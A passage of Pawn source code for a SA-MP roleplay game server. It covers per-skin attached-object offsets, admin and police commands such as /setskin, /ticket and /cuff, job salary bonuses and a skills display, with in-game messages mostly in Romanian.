		case 220: SetPlayerAttachedObject( playerid, 1, model, 2, 0.122851, 0.018736, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 220
		case 221: SetPlayerAttachedObject( playerid, 1, model, 2, 0.187490, -0.009962, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 221
		case 222: SetPlayerAttachedObject( playerid, 1, model, 2, 0.187490, -0.009962, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 222
		case 223: SetPlayerAttachedObject( playerid, 1, model, 2, 0.187490, 0.007295, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 223
		case 224: SetPlayerAttachedObject( playerid, 1, model, 2, 0.148834, -0.016988, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 224
		case 225: SetPlayerAttachedObject( playerid, 1, model, 2, 0.148834, -0.016988, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 225
		case 226: SetPlayerAttachedObject( playerid, 1, model, 2, 0.148834, -0.016988, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 226
		case 227: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175808, 0.000124, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 227
		case 228: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175808, 0.000124, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 228
		case 229: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.009810, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 229
		case 230: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.009810, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 230
		case 231: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, 0.017909, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 231
		case 232: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.002900, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 232
		case 233: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.002900, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 233
		case 234: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.022515, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 234
		case 235: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.022515, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 235
		case 236: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 236
		case 237: SetPlayerAttachedObject( playerid, 1, model, 2, 0.137351, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 237
		case 238: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172246, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 238
		case 239: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172246, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 239
		case 240: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172469, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 240
		case 241: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172469, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 241
		case 242: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172469, -0.005257, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 242
		case 243: SetPlayerAttachedObject( playerid, 1, model, 2, 0.120642, 0.012000, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 243
		case 244: SetPlayerAttachedObject( playerid, 1, model, 2, 0.120642, 0.012000, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 244
		case 245: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172256, -0.006535, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 245
		case 246: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172256, -0.006535, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 246
		case 247: SetPlayerAttachedObject( playerid, 1, model, 2, 0.172256, 0.015483, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 247
		case 248: SetPlayerAttachedObject( playerid, 1, model, 2, 0.195495, 0.006421, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 248
		case 249: SetPlayerAttachedObject( playerid, 1, model, 2, 0.195495, 0.006421, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 249
		case 250: SetPlayerAttachedObject( playerid, 1, model, 2, 0.156291, -0.007588, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 250
		case 251: SetPlayerAttachedObject( playerid, 1, model, 2, 0.156291, -0.007588, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 251
		case 252: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.007588, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 252
		case 253: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.007588, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 253
		case 254: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.007588, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 254
		case 255: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.007588, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 255
		case 256: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.005231, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 256
		case 257: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, 0.012026, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 257
		case 258: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.012517, -0.002862, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 258
		case 259: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.014782, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 259
		case 260: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.014782, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 260
		case 261: SetPlayerAttachedObject( playerid, 1, model, 2, 0.166753, -0.014782, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 261
		case 262: SetPlayerAttachedObject( playerid, 1, model, 2, 0.142282, 0.013118, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 262
		case 263: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.013855, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 263
		case 264: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.013855, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 264
		case 265: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 265
		case 266: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 266
		case 267: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 267
		case 268: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 268
		case 269: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 269
		case 270: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158379, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 270
		case 271: SetPlayerAttachedObject( playerid, 1, model, 2, 0.175637, -0.005807, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 271
		case 272: SetPlayerAttachedObject( playerid, 1, model, 2, 0.182708, 0.001264, 0.009909, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 272
		case 273: SetPlayerAttachedObject( playerid, 1, model, 2, 0.133486, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 273
		case 274: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135796, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 274
		case 275: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135796, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 275
		case 276: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135796, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 276
		case 277: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135796, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 277
		case 278: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135796, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 278
		case 279: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135796, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 279
		case 280: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151893, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 280
		case 281: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151893, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 281
		case 282: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151893, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 282
		case 283: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151893, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 283
		case 284: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151893, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 284
		case 285: SetPlayerAttachedObject( playerid, 1, model, 2, 0.151893, -0.008114, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 285
		case 286: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158825, 0.006832, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 286
		case 287: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158825, 0.006832, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 287
		case 288: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158825, 0.006832, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 288
		case 289: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158825, 0.017294, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 289
		case 290: SetPlayerAttachedObject( playerid, 1, model, 2, 0.158825, -0.002320, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 290
		case 291: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169287, 0.002255, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 291
		case 292: SetPlayerAttachedObject( playerid, 1, model, 2, 0.169287, 0.002255, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 292
		case 293: SetPlayerAttachedObject( playerid, 1, model, 2, 0.135447, 0.002255, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 293
		case 294: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168825, 0.002255, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 294
		case 295: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168825, -0.013864, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 295
		case 296: SetPlayerAttachedObject( playerid, 1, model, 2, 0.168825, -0.013864, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 296
		case 297: SetPlayerAttachedObject( playerid, 1, model, 2, 0.183773, -0.006650, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 297
		case 298: SetPlayerAttachedObject( playerid, 1, model, 2, 0.165301, -0.006650, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 298
		case 299: SetPlayerAttachedObject( playerid, 1, model, 2, 0.197506, 0.008296, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 299
		case 300: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 300
		case 301: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 301
		case 302: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 302
		case 303: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 303
		case 304: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 304
		case 305: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 305
		case 306: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 306
		case 307: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 307
		case 308: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 308
		case 309: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 309
		case 310: SetPlayerAttachedObject( playerid, 1, model, 2, 0.144926, 0.007234, -0.002116, 0.000000, 0.000000, 0.000000, 1.000000, 1.000000, 1.000000 ); // Skin 310
	}
	return true;
}	

cmd:setskin(playerid, params[]) {
    if(PlayerInfo[playerid][pAdmin] < 6) 
    	return SendClientMessage(playerid, COLOR_WHITE, AdminOnly);

	extract params -> new player:id, level; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/setskin <playerid/name> <0-310>");

	if(level < 1 || level > 311) 
		return SendClientMessage(playerid, -1, "Wrong skin ID.");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if(!IsPlayerLogged(id))
		return SendClientMessage(playerid, COLOR_GREY, "Player not logged.");

	PlayerInfo[id][pModel] = level;
	SetPlayerSkin(id, PlayerInfo[id][pModel]);
	format(gString, 128, "* Admin %s set %s's skin to %d.", GetName(playerid), GetName(id), level);
	if(!Iter_Contains(Acovers, playerid)) SendAdminMessage(COLOR_YELLOW, gString, 1);
	SCMf(id, COLOR_YELLOW, "Admin %s ti-a setat skinul in %d.", GetName(playerid), level);
	UpdateVar(id, "Model", level);
	return true;
}
cmd:ticket(playerid, params[]) {
	if !IsACop(playerid) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist.");
	
	if PlayerInfo[playerid][pMember] == 2 || PlayerInfo[playerid][pMember] == 3 *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda!");

	if !OnDuty[playerid] *then
		return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Nu esti la datorie!");

	extract params -> new player:id; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/ticket <playerid/name>");

	if !IsPlayerConnected(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !IsPlayerLogged(id) *then
		return SendClientMessage(playerid, COLOR_GREY, "Acel player nu este logat!");

	if !ProxDetectorS(8.0, playerid, id) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

	if IsACop(id) *then 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti da amenda unui politist!");
					
	gString[0] = EOS;
	for(new i = 0; i < 3; i++) {
		format(gQuery, 60, "%s ($50.000 / level)\n", ticketName(i)); 
		strcat(gString, gQuery);
	}
	format(gQuery, 100, "Ticket > %s", GetName(id));
	ShowPlayerDialog(playerid, DIALOG_TICKET, DIALOG_STYLE_LIST, gQuery, gString, "Ok", "Cancel");	
	listitemm[playerid] = id;						
	return true;
}
cmd:help(playerid, params[]) return ShowPlayerDialog(playerid, DIALOG_HELP, DIALOG_STYLE_LIST, "Help", "Account\nGeneral\nChat\nBank\nVehicles\nHouse\nBusiness\nFaction\nLeader\nPhone\nJobs\nClan", "Ok", "Exit");

stock IsPlayerFalling(playerid) {
    new index = GetPlayerAnimationIndex(playerid);
    if(index >= 958 && index <= 979 || index == 1130 || index == 1195 || index == 1132) return true;
    return false;
}

cmd:stopanim(playerid, params[]) {
	if(IsPlayerInAnyVehicle(playerid)) return true;
	if(HaveBag[playerid] == 1) return true;
	if(Freezed[playerid] == 1) return true;
	if(IsPlayerFalling(playerid)) return SendClientMessage(playerid, -1, "Nu poti folosi aceasta comanda in timp ce cazi!");
	ClearAnimations(playerid);
    return true;
}
cmd:tazer(playerid, params[]) {
	if(!IsACop(playerid)) return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist.");
	if(OnDuty[playerid] == 0) return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");
	if(GetPlayerWeapon(playerid) != 24) return SendClientMessage(playerid,COLOR_GREY, "Pentru a activa tazer-ul, trebuie sa ai un Deagle in mana!");
	switch(tazer[playerid]) {
		case 0: {
			tazer[playerid] = 1;
			new string[128];
			format(string, sizeof(string), "* %s equiped a taser.", GetName(playerid));
			ProxDetector(30.0, playerid, string, COLOR_PURPLE);				
		}
		case 1: {
			tazer[playerid] = 0;
			SendClientMessage(playerid, -1, "Tazer off!");
		}
	}
	return true;
}
cmd:cuff(playerid, params[]) {
    if(!IsACop(playerid)) 
    	return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist.");

	new id;
	if(sscanf(params, "u", id)) 
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/cuff <playerid/name>");

	if(!IsPlayerConnected(id))
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");
	
	if(IsACop(id)) 
		return true;

	if(!OnDuty[playerid]) 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");
	
	if(PlayerCuffed2[id]) 
		return true;

	if(!ProxDetectorS(8.0, playerid, id)) 
		return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

	if(id == playerid) 
		return SendClientMessage(playerid, COLOR_GREY, "Nu poti folosi aceasta comanda asupra ta!");

	if(!IsPlayerInAnyVehicle(id)) 
		return true;

	TogglePlayerControllable(id, false);
	format(gString, 128, "* %s has handcuffed %s.", GetName(playerid),GetName(id));
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
	PlayerCuffed2[id] = 1;
	SetPlayerAttachedObject(id, 1, 19418, 6, -0.011000, 0.028000, -0.022000, -15.600012, -33.699977, -81.700035, 0.891999, 1.000000, 1.168000);
	SetPlayerSpecialAction(id,SPECIAL_ACTION_CUFFED);
	return true;
}
cmd:uncuff(playerid, params[]) {
    if !IsACop(playerid) *then 
    	return SendClientMessage(playerid, COLOR_GREY, "Nu esti politist.");

	if !OnDuty[playerid] *then 
		return SendClientMessage(playerid, COLOR_LGREEN, "Nu poti folosi aceasta comanda deoarece nu esti la datorie!");


	extract params -> new player:giveplayerid; else
		return SendClientMessage(playerid, COLOR_GREY, "USAGE: {FFFFFF}/uncuff <playerid/name>");

	if !IsPlayerConnected(giveplayerid) *then 
		return SendClientMessage(playerid, COLOR_GREY, "That user is not connected.");

	if !ProxDetectorS(8.0, playerid, giveplayerid) *then 
		return SendClientMessage(playerid, -1, "Acel player nu este langa tine.");

	if giveplayerid == playerid || !PlayerCuffed2[giveplayerid] *then 
		return true;

	TogglePlayerControllable(giveplayerid, true);
	format(gString, 128, "* %s has uncuffed %s.", GetName(playerid),GetName(giveplayerid));
	ProxDetector(30.0, playerid, gString, COLOR_PURPLE);
	format(gString, 128, "* Ai fost descatusat de %s.", GetName(playerid));
	SendClientMessage(giveplayerid, COLOR_LIGHTBLUE, gString);
	PlayerCuffed2[giveplayerid] = false;
	SetPlayerSpecialAction(giveplayerid,SPECIAL_ACTION_NONE);
	RemovePlayerAttachedObject(giveplayerid,1);
	return true;
}
new const r_x[8] = {0, 30, 90, 210, 450, 600, 750,750};
stock GetNeedPoints(playerid, job_id) return r_x[PlayerInfo[playerid][pJobSkill][job_id]];

stock skinComision(skinid) {
	switch skinid
	do {
		case 291, 127, 123, 72, 59, 46, 33, 11, 171, 178, 188: return 15;
		case 299, 296, 295, 290, 289, 254, 248, 228, 204, 177, 83, 84: return 25;
		case 0, 3, 93, 104, 107, 116, 115, 149, 164, 195, 211, 285, 292, 293, 294: return 35;
		case 297, 273, 260, 269, 263, 221, 219, 186, 184, 121, 120, 106: return 50;
		case 298, 272, 271, 242, 233, 223, 217, 191, 126, 125, 124, 108, 98, 264: return 50;
		case 18, 19, 35, 40, 45, 87, 88, 97, 140, 154, 193, 214, 252: return 60;
		case 105, 113, 119, 144, 167, 185, 206, 90, 91, 169: return 60;
		case 12, 41, 55, 85, 92, 138, 141, 152, 172, 194, 216, 251: return 69;
		case 118,122,128,145,146,147,148,150,153,173,174,175,176,179,180,181,183,187,189,190: return 60;
	}
	return 0;
}

stock GiveJobSalary(playerid, money=0,pet_points=0,skill_points=1,temp_Val=0) {
	new TotalMoneyy = money;
	SendClientMessage(playerid, 0x50B32DFF, "----");
	va_SendClientMessage(playerid, -1, "Castig: {50B32D}$%s", FormatNumber(money));

	if(PlayerInfo[playerid][pPremiumAccount]) {
		va_SendClientMessage(playerid, -1, "Premium Account: {50B32D}+$%s {FFFFFF}(50%s din $%s)", FormatNumber(money/2), "%%", FormatNumber(money));
        TotalMoneyy += money/2;
	}
	if(GetSkinRare(PlayerInfo[playerid][pModel])) {
		temp_Val = p_Procent(money, skinComision(PlayerInfo[playerid][pModel]));
		va_SendClientMessage(playerid, -1, "Skin (%s): {50B32D}+$%s {FFFFFF}(%d%s din $%s)", GetSkinType(PlayerInfo[playerid][pModel]), FormatNumber(temp_Val), skinComision(PlayerInfo[playerid][pModel]), "%%", FormatNumber(TotalMoneyy));
		TotalMoneyy+=temp_Val;
	}
	if(JobVehicle[playerid]) {
		PlayerPlaySound(playerid, 1133, 0.0, 0.0, 0.0);
		SetVehicleHealth(JobVehicle[playerid], 999.0);
		RepairVehicle(JobVehicle[playerid]);
	}
	va_SendClientMessage(playerid, -1, "Castig total: {50B32D}$%s {FFFFFF}(timp: %02d:%02d)", FormatNumber(TotalMoneyy), (gettime()-JobTime[playerid])/60, (gettime()-JobTime[playerid]) % 60);
	MoneyEarned[playerid] += money;
	CurseFacute[playerid] ++;
	fishCount[playerid] = 0;
	if(PlayerInfo[playerid][pClan]) {
		new clanid = PlayerInfo[playerid][pClan];
		temp_Val = p_Procent(TotalMoneyy, ClanInfo[clanid][clBonus] * 10);
		PlayerInfo[playerid][pClanMoney] += temp_Val;
		ClanInfo[clanid][ClanBank] += temp_Val;
		va_SendClientMessage(playerid, -1, "Clan safebox: {50B32D}+$%s {FFFFFF}(%d%s)", FormatNumber(temp_Val), ClanInfo[clanid][clBonus] * 10, "%%");
	}
	SendClientMessage(playerid, 0x50B32DFF, "----");
	TimerPayDay[playerid] = gettime()+7;
	updatePlayerGoal(playerid, money);
	UpdateJobGoal(TotalMoneyy);
	GivePlayerCash(playerid, TotalMoneyy);
	givePetPoint(playerid, pet_points);
	givePlayerSkill(playerid, skill_points);
	UpdateJobStats(playerid);
	JobTime[playerid] = gettime();
	JobInfo[PlayerInfo[playerid][pJob]][jBalance] += TotalMoneyy;
	_query("UPDATE `jobs` SET `Balance`='%i' WHERE `ID`='%i'", JobInfo[PlayerInfo[playerid][pJob]][jBalance], PlayerInfo[playerid][pJob]);
	return true;
}

cmd:skills(playerid, params[]) {
	SendClientMessage(playerid, -1, "---- Skills ----");
	if(PlayerInfo[playerid][pJobSkill][1]!=7) SCMf(playerid, -1, "Farmer Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][1], PlayerInfo[playerid][pJobSkillPoints][1], GetNeedPoints(playerid, 1));
	else SCMf(playerid, -1, "Farmer Skill: {FFFF00}Skill Plus{FFFFFF} | Worked Times: %d", PlayerInfo[playerid][pJobSkillPoints][1]);
	if(PlayerInfo[playerid][pJobSkill][2]!=7) SCMf(playerid, -1, "Trucker Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][2], PlayerInfo[playerid][pJobSkillPoints][2], GetNeedPoints(playerid, 2));
	else SCMf(playerid, -1, "Trucker Skill: {FFFF00}Skill Plus{FFFFFF} | Worked Times: %d", PlayerInfo[playerid][pJobSkillPoints][2]);
	if(PlayerInfo[playerid][pJobSkill][3]!=7) SCMf(playerid, -1, "Lumberjack Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][3], PlayerInfo[playerid][pJobSkillPoints][3], GetNeedPoints(playerid, 3));
	else SCMf(playerid, -1, "Lumberjack Skill: {FFFF00}Skill Plus{FFFFFF} | Worked Times: %d", PlayerInfo[playerid][pJobSkillPoints][3]);
	SCMf(playerid, -1, "Garbage Man Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][4], PlayerInfo[playerid][pJobSkillPoints][4], GetNeedPoints(playerid, 4));
	if(PlayerInfo[playerid][pJobSkill][9]!=7) SCMf(playerid, -1, "Pizza Boy Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][9], PlayerInfo[playerid][pJobSkillPoints][9], GetNeedPoints(playerid, 9));
	else SCMf(playerid, -1, "Pizza Boy Skill: {FFFF00}Skill Plus {FFFFFF}| Worked Times: %d", PlayerInfo[playerid][pJobSkillPoints][9]);
	SCMf(playerid, -1, "Curier Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][10], PlayerInfo[playerid][pJobSkillPoints][10], GetNeedPoints(playerid, 10));
	if(PlayerInfo[playerid][pJobSkill][11]!=7) SCMf(playerid, -1, "Fisher Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][11], PlayerInfo[playerid][pJobSkillPoints][11], GetNeedPoints(playerid, 11));
	else SCMf(playerid, -1, "Fisher Skill: {FFFF00}Skill Plus {FFFFFF}| Worked Times: %d", PlayerInfo[playerid][pJobSkillPoints][11]);
	SCMf(playerid, -1, "Forklift Skill: %d/6 | Worked Times: %d/%d", PlayerInfo[playerid][pJobSkill][12], PlayerInfo[playerid][pJobSkillPoints][12], GetNeedPoints(playerid, 12));
